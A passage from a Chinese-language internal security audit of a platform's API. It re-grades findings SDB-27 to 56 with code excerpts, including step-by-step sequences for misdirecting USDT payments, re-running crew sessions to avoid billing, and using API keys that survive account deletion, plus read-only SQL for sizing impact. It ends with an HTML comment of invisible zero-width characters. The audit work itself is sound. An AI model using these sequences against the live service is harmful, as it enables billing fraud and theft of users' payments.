  2. 前四轮已逐行：`unref-services.txt` ⇒ **126**（§十七已自证 126−126=0）。
  3. 本轮对象：`ref-services.txt` = 365 − 126 ⇒ **239**。
  4. 本轮分 7 路：A 资金 30 + B 中继池 34 + C 外部调用 35 + D 鉴权审计 45 + E1 超大文件 17 + E2 统计调度 39 + E3 上传/clawdbot 39 = **239**；7 路子代理均回执 `COVERED: n/N` 且 n=N（17/17、30/30、34/34、35/35、39/39、39/39、45/45）。
  5. **239 − 239 = 0** ⇒ 「已被 findings-api 引用的文件」本轮差集为空；叠加前四轮，`365` 全量亦已无未逐行文件。
- **文件清单落盘**：`ref-services.txt`（239 个）、`ref-services-sized.txt`（按行数降序）、`batch-A/B/C/D/E1/E2/E3.txt`（各路清单）。
- **收敛判定**：本轮新增 **30 条**（P1×5 / P2×13 / P3×12），**非零新增，按既定规则不宣布收敛**。其中 5 条 P1 均给出真实可达路径与逐字证据：SDB-27/28（USDT 资金归属与 ERC20 不到账）、SDB-29（注销后 API 凭据仍有效）、SDB-30（Crew 计费可绕过）、SDB-31（团队记忆越权写）。另 6 组候选经回原文核对判为台账重复/同源，已单列 §十九。
- **下一轮建议**：①对 §十八 的 30 条逐条做二次取证与定级复核（尤其 SDB-27/28 的线上收款地址形态、SDB-29 的 API Key 实际存活量）；②对 §二十 的 13 条按条目补齐证据；③对 SDB-32/SDB-36 这类并发缺陷补「两路并发」的复现脚本证据（只读环境可做静态推演，不必改仓库）。

---

## 二十二、二次取证与定级复核（30 条 + 13 条未判定）

- **基线漂移核对**：复核前实测 `git rev-parse origin/main` = `78c3a05c4`（已非 `d4e1621806`），但 `git diff --name-only d4e1621806..origin/main` 只含 `.ihui-agent` 守护脚本与文档，**不含 `apps/api`、`packages/database`**；故本轮所有行号与代码在 `d4e1621806` 与 `origin/main` 上逐字一致。所有结论仍以 `d4e1621806` 为基线。
- **方法**：SDB-27~31 由主审逐行复核；SDB-32~56 分 3 路、13 条未判定 1 路并行复核，所有候选结论均回原文核对行号与逐字代码后才写入。全程只读：未改仓库、未提交、未 push、未连库、未跑测试/迁移。
- **结论方向**：30 条中 **0 条被否证、5 条降级、25 条维持**；13 条未判定中 **8 条定论成立、5 条否证**。
- **关于「因证据不足被降级」**：本轮 5 条降级**都不是**因为证据不足，而是证据充分后确认**可达性或影响面低于原判**（详见 22.3）。真正仍缺证据的只有 3 条——SDB-28（链上累计笔数）、SDB-29（`status=3` 用户存量）、SDB-52（重复备案号样本）——这 3 条按「条件成立」**保留原级、不降级**。

### 22.1 修正后严重度总表

| 编号 | 原级 | 修正 | 判定 | 依据摘要 |
|---|---|---|---|---|
| SDB-27 | P1 | **P1** | 维持 | 同额付款被先轮询订单抢绑；确认侧 txHash 查重使真实付款人永不到账（22.2.1） |
| SDB-28 | P1 | **P1** | 维持（条件成立） | 复核固定 `page=1&offset=100&sort=asc`；地址累计 >100 笔即 100% 查不到。需链上数据核实笔数，未降级（22.2.2） |
| SDB-29 | P1 | **P1** | 维持（条件成立） | 注销只匿名化 users 行、不删 Key；Key 鉴权不查 `users.status`。存量需生产 SQL，未降级（22.2.3） |
| SDB-30 | P1 | **P1** | 维持 | `ne(status,'running')` 允许 completed 重跑；扣费幂等键固定 `crew:<id>` → 第二次起免费；取消/异常也不扣费（22.2.4） |
| SDB-31 | P1 | **P2** | 降级 | POST 确实漏 scope 校验，但全仓无 agent/LLM 消费 team_memories → 影响是团队数据污染而非提示注入（22.2.5） |
| SDB-32 | P2 | **P2** | 维持 | 快照整列回写 + 无 cred_version CAS，跨路径并发可覆盖新 refreshToken；失败分支同样绝对覆盖 |
| SDB-33 | P2 | **P2** | 维持 | timestamp 参与签名且格式/时区双错；默认未配置 ALIPAY，但一旦启用即全断 |
| SDB-34 | P2 | **P2** | 维持 | 写入侧对 group='privacy' 任意键 upsert；`analyticsEnabled=true` 即被预热误判为「不留存原文」 |
| SDB-35 | P2 | **P3** | 降级 | 默认关闭；NaN 需 Prometheus 返回字面量；回滚只改 env + DB，而 canary-router 在注册时已固化 env，实际分流不变（22.3） |
| SDB-36 | P2 | **P3** | 降级 | 竞态窗口毫秒级；canary_configs 仅被管理端展示读取，不驱动实际分流（22.3） |
| SDB-37 | P2 | **P2** | 维持 | `cancelled` 标记只写不消费，被取消节点仍调模型并进入最终结果 |
| SDB-38 | P2 | **P2** | 维持 | DAG 分支形参为 `_retry/_quotas` 且函数体无配额检查；ai-service 侧无兜底 |
| SDB-39 | P2 | **P2** | 维持 | searchSymbols 不传 ownerUuid → `1=0` 恒空；embedding 先于检索发生，缓存键不含 userId |
| SDB-40 | P2 | **P3** | 降级 | workspacePath/cwd 已过登记根闸；ls/dir/wc/stat/test 仅泄露目录名/大小/存在性，读不到正文（22.3） |
| SDB-41 | P2 | **P3** | 降级 | `autoCommit` 默认 false（显式 opt-in），且提交发生在用户自有登记工作区；后果是多一条提交，非数据丢失（22.3） |
| SDB-42 | P2 | **P2** | 维持 | `.db` 被白名单拒、`.json` 命中 sqlite parser；服务端 cc-switch 上传两条路均不可用 |
| SDB-43 | P2 | **P2** | 维持 | DB 异常只进 errors，escalated 不含 errors，worker 仍记 success |
| SDB-44 | P3 | **P3** | 维持（观察级） | 轮询 SQL 已先过滤 `expires_at > now`，过期分支仅查询→复核间竞态可达；不引入 P4 刻度 |
| SDB-45 | P3 | **P3** | 维持 | `found:false` 是确定性「对端无此账号」，却被永久重推并占前 100 个重推位 |
| SDB-46 | P3 | **P3** | 维持 | dbRead 快照凭证 + 主库新 credVersion；对端仅按版本防降级，会接受「旧凭证 + 更高版本」 |
| SDB-47 | P3 | **P3** | 维持（观察级） | 单条结果已带 `provider:'stub'`，仅顶层 success/failed 聚合误导 |
| SDB-48 | P3 | **P3** | 维持 | api_logs 无 api_key_id，按 userId 聚合导致同人多 Key 用量相同 |
| SDB-49 | P3 | **P3** | 维持 | 分类批与摘要批并发、选中条件不互斥，后写覆盖且可能重复付费 |
| SDB-50 | P3 | **P3** | 维持 | 首次索引前不建 `.ihui`，仅 self-healing 路径补了 mkdir |
| SDB-51 | P3 | **P3** | 维持 | 白名单含多词项、比较只用首 token 全等，git/node/npm 多词项整类失效 |
| SDB-52 | P3 | **P3** | 维持（条件成立） | 单条多值 upsert 命中同键两次必整批失败；触发需同文件重复备案号，缺样本 |
| SDB-53 | P3 | **P3** | 维持（观察级） | resolved 不进 escalated，仅日志/metadata 语义误导且无界增长 |
| SDB-54 | P3 | **P3** | 维持 | 导入正则拒绝 `INTERVAL`，调度器却能解析；落成 once 后无 scheduledAt 永不执行 |
| SDB-55 | P3 | **P3** | 维持 | parse_mode 固定 HTML 且不转义，含 `<`/`&` 的消息单渠道失败 |
| SDB-56 | P3 | **P3** | 维持 | 直聊只写 assistant 轮、无 100 条裁剪；LLM 上下文有界但 Map 无界 |

**修正后分布：P1×4 / P2×9 / P3×17**（原表头 `P2×13 / P3×12` 系笔误，实际原分布为 P1×5 / P2×12 / P3×13）。

### 22.2 重点五条深证

#### 22.2.1 SDB-27（P1 维持）：收款地址是「系统账户」，不是请求人

- **地址归属**：`payment-usdt-service.ts:388-392` 的地址来自 `getUsdtPaymentConfig()`（env `USDT_TRC20_ADDRESS` / `USDT_ERC20_ADDRESS`），全站唯一；`:409-419` 建单时把该地址写进 `usdt_payments.address`，`userId` 另列。**不存在按用户派生的 `ownerUuid`**：链上收款方是平台系统账户，订单归属靠库内 `userId`，而检测环节没有任何「付款人 → 订单」的绑定信息。
- **可复现调用序列**（TRC20，ERC20 同型）：
  1. A 调 `POST /payment/usdt/create {amountCents:1000, network:"TRC20"}` → 订单 A，`amount=10`，`expiresAt=+30min`，`address=平台地址`。
  2. B 调同一接口同一金额 → 订单 B，`amount=10`，同地址。
  3. B 在 T 时刻向平台地址转入 **10 USDT**（链上唯一一笔新转入）。
  4. 轮询 `pollPendingUsdtPayments`（每分钟，`:1045-1078`）取 `status='pending' AND expires_at>now`，**无 ORDER BY**；先处理到 A 时进入第 5 步。
  5. `checkTrc20Payment`（`:516-555`）以 `order_by=block_timestamp,desc&limit=50&only_to=true` 扫最新 50 笔，命中 B 的 10 USDT：`amount >= expectedAmount` → 返回 **B 的 txHash**。
  6. `confirmUsdtPaymentWithOnChainCheck(A, B.txHash)` → `verifyTrc20OnChain` 地址一致、金额精确等于 10 → `verified` → A 入账。
  7. 处理 B 时 `:955-965` 的 txHash 查重发现已被 A 绑定 → 抛「该链上交易已用于其它订单」→ **B 永不到账，B 的钱记到 A 名下**。
- **额外影响（超付型死单）**：若最新一笔是他人 50 USDT（A 应收 10），检测恒返回这笔 50；复核因金额不等拒绝；而 A 自己后来的 10 USDT 永远排在「首笔 ≥10」之后，**订单永久 pending**。
- **取证**：
```
540	  for (const tx of data.data) {
541	    if (tx.to !== address) continue
542	    if (tx.block_timestamp < sinceTimestamp) continue
543	    const amount = Number(tx.value) / Math.pow(10, USDT_DECIMALS)
544	    if (amount >= expectedAmount) {
...
547	        txHash: tx.transaction_id,
```
```
955	    const dupTx = await tx
956	      .select({ orderId: usdtPayments.orderId })
957	      .from(usdtPayments)
958	      .where(and(eq(usdtPayments.txHash, txHash), not(eq(usdtPayments.orderId, orderId))))
```
- **定级理由**：真实资金错记 + 真实付款人资金丢失，且触发只需「两笔同额订单 + 一笔付款」，属高频场景（同套餐同价）。P1 维持。

#### 22.2.2 SDB-28（P1 维持，条件成立）：ERC20 复核只翻最早 100 笔

- **代码事实**：`verifyErc20OnChain` 固定 `page:'1', offset:'100', sort:'asc'`，然后 `find(hash === txHash)`；Etherscan `sort=asc` 返回**由旧到新**，第 1 页即地址历史上最早的 100 条 USDT 转账。地址累计转入/转出超过 100 笔后，新交易永远不在结果集中 → `:769-770` 返回「未在平台地址转入记录中找到该交易」→ 订单永久 pending。
- **对照**：检测侧用的是 `sort=desc&offset=50`（`:566-574`），所以「检测得到、复核查不到」是稳定复现的组合。
```
752	  const params = new URLSearchParams({
753	    module: 'account',
754	    action: 'tokentx',
755	    address,
756	    contractaddress: ERC20_USDT_CONTRACT,
757	    page: '1',
758	    offset: '100',
759	    sort: 'asc',
760	  })
...
769	  const tx = data.result.find((t) => t.hash.toLowerCase() === txHash.toLowerCase())
770	  if (!tx) return fail('未在平台地址转入记录中找到该交易(可能绑定他人或地址错误)', null, null, null)
```
- **为何不降级**：触发阈值是「该地址累计 USDT 转账笔数」，一旦越过即**永久 100% 失败**，属确定性资金卡死。仓内无法得知线上地址与笔数（地址在 env/库内），故标注「条件成立、需链上数据核实笔数」，保留 P1。**未执行 Etherscan 查询**。

#### 22.2.3 SDB-29（P1 维持，条件成立）：注销后 API 凭据链完整存活

- **调用链**：注销入口调 `purgeUserPii` → `:62-102` 逐表删除 **19** 张用户 PII 子表 → `revokeAllUserRefreshTokens`（只吊销 refresh token）→ `users` 主行 `status: 3` **匿名化但不删除**（`:136-155`）。
- **漏项**：`USER_SCOPED_TABLES`（`:62-102`）与后续清单都不含 `developer_api_keys`；`api_key_shares` 只随源 Key 级联，源 Key 不删则分享 token 继续有效（`schema/api-key-shares.ts:38-45`）。
- **鉴权侧**：`plugins/api-key-auth.ts:919-925` 只查 `developerApiKeys.key` 并断言 `row.status === 'active'`，**不 join `users`、不判 `users.status`**；`requireActiveUser` 只挂在 JWT 路径。
```
919	  const [row] = await db
920	    .select()
921	    .from(developerApiKeys)
922	    .where(eq(developerApiKeys.key, key))
923	    .limit(1)
924	
925	  if (!row || row.status !== 'active') throw unauthorized('Invalid or revoked API key')
```
- **只读核查 SQL（本轮未执行，勿直接打生产）**：
```sql
-- 1) 用户状态分布
SELECT status, count(*) FROM users GROUP BY 1 ORDER BY 1;

-- 2) status=3（已注销）用户仍持有的 active Key
SELECT count(*) AS live_keys, count(DISTINCT k.user_id) AS users
FROM developer_api_keys k
JOIN users u ON u.id = k.user_id
WHERE u.status = 3 AND k.status = 'active';

-- 3) 这些 Key 派生的未撤销、未过期分享 token
SELECT count(*) AS live_shares
FROM api_key_shares s
JOIN developer_api_keys k ON k.id = s.source_api_key_id
JOIN users u ON u.id = k.user_id
WHERE u.status = 3 AND s.revoked_at IS NULL AND s.expires_at > now();
```
- **为何不降级**：代码层「注销不清凭据」是确定事实，影响是已注销账号的凭据可继续调用并消耗余额；实际受影响用户数取决于存量。保守维持 P1，要求修复前先用上表量化。**本轮未连库**。

#### 22.2.4 SDB-30（P1 维持）：重跑条件与扣费幂等的具体组合

- **重跑条件**：`crew-orchestrator.ts:196-201` 用 `UPDATE ... WHERE id = ? AND status <> 'running'` 抢占。`completed`、`failed`、`cancelled` 都满足 `<> 'running'` → 可再次置为 running 并完整重跑。
```
196	    const startedRows = await db
197	      .update(crewSession)
198	      .set({ status: 'running' })
199	      .where(and(eq(crewSession.id, sessionId), ne(crewSession.status, 'running')))
200	      .returning({ id: crewSession.id })
```
- **扣费幂等**：`routes/crew.ts:261-268` 只在 `evt.type === 'complete'` 时调 `deductTokens(..., 'crew:<id>')`；`token-balance-service.ts:188-197` 若 `token_flows` 中已存在 `related_order_no='crew:<id>' AND op_type=1`，直接 `return { success: true }` **不再扣费**。
- **可复现序列**：
  1. 创建会话 S，跑完 → 扣费一次，落 `crew:S` 流水。
  2. 再次 `POST /api/crew/runs/S/stream` → 抢占成功，重新执行全部模型调用。
  3. 再次 complete → 幂等命中 → 返回成功、**0 扣费**。
  4. 重复第 2~3 步 N 次：N 倍模型成本、1 倍计费。
- **旁路加强**：客户端断开触发 `cancel`，orchestrator 以 `type:'error'` 产出带 usage 的事件；路由只对 `complete` 扣费 → **已发生的模型调用同样不计费**。
- **定级理由**：任意登录用户可无限复用自己的会话白嫖模型调用，属计费绕过。P1 维持。

#### 22.2.5 SDB-31（P1 → P2）：越权写成立，但没有「注入消费面」

- **调用链**：`routes/index.ts` 直接注册 `teamMemoryRoutes`，全组只挂 `requireLogin`，无额外 scope 中间件。GET `:116-136` 与详情 `:157-167` 都调 `isScopeMember`；**POST `:139-153` 直接 `createTeamMemory({ scopeId: body.scopeId, sourceUserId: request.userId })`，不校验成员关系**。
```
139	  app.post('/', { preHandler: requireLogin }, async (request, reply) => {
140	    const body = parseOrThrow(createSchema, request.body)
...
145	    const created = await createTeamMemory({
146	      scopeId: body.scopeId,
```
- **消费面核对**：全仓 `teamMemories` 仅被 `team-memory-service.ts` 与 `data-archive-service.ts:134`（归档）引用；未发现 agent / LLM 上下文 / 检索链路读取该表。故攻击者能向任意团队 scope 写入伪造记忆并被成员在列表/详情中看到，但**不会自动进入模型提示词**。
- **降级理由**：影响从「持久化提示注入」收敛为「跨团队数据污染 + 存储滥用」，且读侧有成员校验、写侧只增不改不删。P2 合适。

### 22.3 五条降级的具体依据

1. **SDB-31 P1→P2**：见 22.2.5，缺自动消费面。
2. **SDB-35 P2→P3**：`startAutoRollbackMonitor` 在 `CANARY_ENABLED !== 'true'` 时直接 return（`auto-rollback.ts:121-123`）；`fetchCanaryErrorRate` 的网络失败/非 200/空结果都返回 0，只有 Prometheus 返回字面量 `"NaN"`/`"+Inf"` 才会走进 `NaN < 阈值 === false`。即便误触发，`rollbackCanary` 只改 `process.env`（`:58-59`）+ 可选 DB，而 `plugins/canary-router.ts:62-64` 在**注册时**就把 `enabled/percentage` 读进闭包 → 运行期改 env 不影响分流。实际危害限于误告警与监控自停。
3. **SDB-36 P2→P3**：两条 UPDATE 确实无 CAS，但 `getCanaryPercentage` 全仓只被 `routes/canary.ts:165`、`routes/admin-gray-release.ts:33,102` 用于**展示/审计**；实际灰度分流由 `canary-router` 的 env + 请求头决定，不读 `canary_configs`。竞态窗口是 SELECT→UPDATE 的毫秒级，后果是管理端阶段显示被覆盖。
4. **SDB-40 P2→P3**：`SandboxExecutor.execute` 已对 `workspacePath` 与 `cwd` 做 `assertWithinRegisteredRoots` 且要求两者同根（`:1166-1177`）；命令经 `parseShellCommand` 拒绝 shell 元字符并用 `execFile`。缺口只在「参数路径」：`SANDBOX_FILE_TOOL_BINARIES`（cat/head/tail/cp/tee 等）逐参数检查，`ls/dir/wc/stat/test` 不在该集合，可读工作区外目录的**名称/大小/存在性/行数**，但读不到文件正文（`cat/head/tail` 受闸）。Windows 上 `ls/dir/test` 无独立可执行文件，多半直接 ENOENT。
5. **SDB-41 P2→P3**：`routes/spec.ts:472` 的 `autoCommit: z.boolean().default(false)`，属显式 opt-in；`runGit` 的 `cwd` 是用户登记工作区（`spec-service.ts:1457-1464`），提交内容是该仓库里**用户自己已暂存的改动**。后果是多出一条 `chore(spec)` 提交，不会丢失或篡改未暂存内容；若登记根跨租户共享才回升 P2。

### 22.4 13 条未判定：定论表

| # | 事项 | 结论 | 建议级 | 关键证据 |
|---|---|---|---|---|
| 1 | relay 多帧 usage 覆盖为 0 | **成立**（代码层确定；触发需上游帧形态实测） | P2 | `relay-upstream-forwarder.ts:549-560` 每帧直接赋值，`readNum` 缺失即 0，无单调合并 |
| 2 | sweep 锁 TTL 是否覆盖最坏一轮 | **条件成立**（需实测单轮耗时/多实例） | P2 | `:232-240` BATCH 50/并发 5/TTL 10min；`:883,997,1035` 候选 50+50+10，折算 ≈34 串行调用，单次 >17.6s 即破锁 |
| 3 | `meta.state ?? 'enabled'` 回落 | **否证** | — | `relay-account-pool-checkin-sync.ts:411-414` 解析层已把非三值归一为 `null`；写入面无非法值 |
| 4 | relay 响应缓存跨用户复用 | **否证**（设计使然）；键维度缺失与 **F-180** 重复 | — | `relay-response-cache.ts:208-227` 注释明示排除 user；`findings-api.md:2320` 已覆盖 `top_p/seed/response_format` |
| 5 | 返佣插库无唯一键 / 释放未校验行数 | **否证**（重复触发不可达） | — | `relay-commission-service.ts:315-337` 释放以 `status='frozen'` 条件写 + `returning` 判空；插入仅 `recordCall` 单次 `setImmediate` |
| 6 | `redeemCoupon` 传 tx 仍用全局 db | **否证**（当前无 tx 调用方） | — | `coupon-service.ts:496-507` 用全局 `db`；唯一调用 `miniapp-pay-routes.ts:220-223` 三参且失败退券 |
| 7 | 取 openid 无 orderBy | **成立** | P3 | `wechat-subscribe-message.ts:39-51` `limit(1)` 无排序；`schema/oauth.ts:184-186` 唯一键是 `(platform,open_id)`，同用户可有两行 |
| 8 | `generateQrcode` 把 JSON 当 PNG | **否证**（零调用方） | — | 全仓 `generateQrcode` 仅 `oauth-providers.ts:287` 定义，无路由/服务引用 |
| 9 | 短信限速失败不退配额 | **成立** | P2 | `sms.ts:262-270` 先 `consumeSendQuota`，限速拒绝直接 return；仅投递失败 `:301` 才退；与 `:254` 注释矛盾 |
| 10 | 多副本重复执行 patrol/subagent | **条件成立**（仅多副本部署） | P2 | `patrol-scheduler.ts:306-325` 进程内 `running` + select→执行无 claim；子代理恢复把他进程 running 视为接管。仓内为蓝绿单活 |
| 11 | 文档解析只限原始 20MB | **成立** | P2 | `document-parser.ts:222-225` 只校验压缩后长度；`xlsx-parser.ts:210-214` exceljs 全量 load，无解压总量/条目上限 |
| 12 | 全局知识 `ownerUuid=''` 永不命中 | **成立**（影响待数据） | P3 | `knowledge-chat-context.ts:58-69` userId 空即 return；检索严格 `owner_uuid = userId`。缺 `owner_uuid=''` 存量数据 |
| 13 | 自动化导入无同名去重 | **成立** | P3 | `runtime-import-plan.ts:134-158` 无 seen 集合；`schema/user-automations.ts:77-81` 无 `(user_id,name)` 唯一键 → 产生重复行，不整批失败 |

**统计**：成立 8（#1、#2、#7、#9、#10、#11、#12、#13），否证 5（#3、#4、#5、#6、#8）。#2/#10 为「条件成立」，需部署形态与耗时实测才能确定发生率，但代码缺口已确凿。

### 22.5 本轮否证与重复单列（附依据）

1. **checkin-sync `meta.state` 回落启用** —— **否证**。解析层 `:411-414` 已将非 `enabled|disabled|pool_deleted` 归一为 `null`，运行期造不出非法值；仅外部篡改 jsonb 的脏数据可达。
2. **relay 响应缓存跨用户复用** —— **否证 + 重复**。`relay-response-cache.ts:208-227` 明示缓存键排除 user/时间戳、只按 model+messages+采样参数，属产品口径；其「`top_p/seed/response_format` 未入键」与 `findings-api.md:2320` F-180 完全同源，不新增编号。
3. **返佣重复入账 / 释放未校验行数** —— **否证**。`relay-commission-service.ts:315-337` 已用 `status='frozen'` 条件更新并检查 `returning` 是否为空；插入只由 `recordCall` 每账单一次触发，无重试/补偿路径。残留的「Key 在两步之间被删 → released 但未加钱」为 P3 观察，无触发证据。
4. **`redeemCoupon` 传 tx 仍写全局 db** —— **否证**（当前不可达）。唯一调用方 `miniapp-pay-routes.ts:220-223` 不传 tx，且有 `refundCoupon` 补偿；若将来按注释接入事务调用，则回升 P2。
5. **`generateQrcode` 坏图** —— **否证**。全仓唯一引用是函数定义本身（`oauth-providers.ts:287`），无任何调用方。

**另**：本轮未发现 §十八 30 条中有可被否证的条目；30 条的代码事实全部成立，差异只在可达性与影响面。

### 22.6 本轮统计与结论

- **30 条复核结果**：维持 25（P1×4、P2×8、P3×13）＋ 降级 5（SDB-31→P2；SDB-35/36/40/41→P3）＋ 否证 0。
- **13 条未判定结果**：成立 8（P2×5、P3×3）＋ 否证 5；剩余跨轮未判定从 26 降为 **13**（均为前四轮存量）。
- **是否收敛**：本轮属于纵深复核，**不新增面、不宣布收敛**。§十八 的 30 条仍是「确认缺陷」，只是等级分布修正为 P1×4 / P2×9 / P3×17。
- **仍缺的证据（不做结论升级）**：①SDB-28 平台 ERC20 地址累计 USDT 笔数（链上数据，本轮未查询）；②SDB-29 `status=3` 且持 active Key 的用户数（需生产 SQL，本轮未执行）；③SDB-52 同一 docx 中重复备案号的真实样本；④未判定 #1 的上游 SSE 多帧 usage 报文样本；⑤#2/#10 的单轮耗时与部署副本数实测。
- **下一步优先级**：先修 SDB-27/28/29/30 四条 P1（都涉及资金或凭据），再处理 SDB-32/37/38/39 四条 P2（并发覆盖、DAG 配额/取消、检索恒空）。
<!-- ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠ -->
